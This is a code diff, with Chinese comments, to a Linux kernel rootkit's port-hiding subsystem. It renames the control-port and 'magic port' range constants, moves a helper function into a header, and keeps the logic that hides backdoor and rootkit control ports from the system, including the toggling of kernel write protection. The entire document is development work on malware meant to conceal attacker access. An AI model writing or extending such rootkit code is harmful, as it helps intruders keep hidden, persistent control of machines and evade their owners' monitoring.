@@ -76,17 +76,12 @@ static int add_hidden_port(__be32 local_addr, __be16 local_port,
 static int remove_hidden_port(__be16 port, int protocol);
 static void clear_hidden_ports(void);
 static int should_hide_port(__be16 port);
-static int is_magic_port(__be16 port);
 
-// 检查是否为魔术端口
-static int is_magic_port(__be16 port) {
-    __be16 host_port = ntohs(port);
-    return (host_port >= MAGIC_PORT_RANGE_START && host_port <= MAGIC_PORT_RANGE_END);
-}
+// 注意：is_magic_port函数已在rootkit.h中定义，这里不需要重复定义
 
 // 检查端口是否应该被隐藏
 static int should_hide_port(__be16 port) {
-    return is_magic_port(port) || ntohs(port) == ROOTKIT_PORT;
+    return is_magic_port(ntohs(port)) || ntohs(port) == CONTROL_PORT;
 }
 
 // 检查连接是否应该被隐藏
@@ -451,9 +446,9 @@ void get_hidden_ports_info(char *buffer, size_t size) {
     
     offset += snprintf(buffer + offset, size - offset,
                       "\nMagic Port Range: %d-%d\n",
-                      MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
+                      MAGIC_PORT_START, MAGIC_PORT_END);
     offset += snprintf(buffer + offset, size - offset,
-                      "Rootkit Control Port: %d\n", ROOTKIT_PORT);
+                      "Rootkit Control Port: %d\n", CONTROL_PORT);
 }
 
 // 批量隐藏常见后门端口
@@ -496,15 +491,15 @@ int init_port_hiding(void) {
     enable_write_protection();
     
     // 自动隐藏魔术端口范围
-    hide_port_range(htons(MAGIC_PORT_RANGE_START), htons(MAGIC_PORT_RANGE_END), 0);
+    hide_port_range(htons(MAGIC_PORT_START), htons(MAGIC_PORT_END), 0);
     
     // 隐藏rootkit控制端口
-    hide_port(htons(ROOTKIT_PORT), 0);
+    hide_port(htons(CONTROL_PORT), 0);
     
     printk(KERN_INFO "[rootkit] Port hiding subsystem initialized\n");
     printk(KERN_INFO "[rootkit] Magic port range: %d-%d\n", 
-           MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
-    printk(KERN_INFO "[rootkit] Rootkit control port: %d\n", ROOTKIT_PORT);
+           MAGIC_PORT_START, MAGIC_PORT_END);
+    printk(KERN_INFO "[rootkit] Rootkit control port: %d\n", CONTROL_PORT);
     
     return 0;
 }
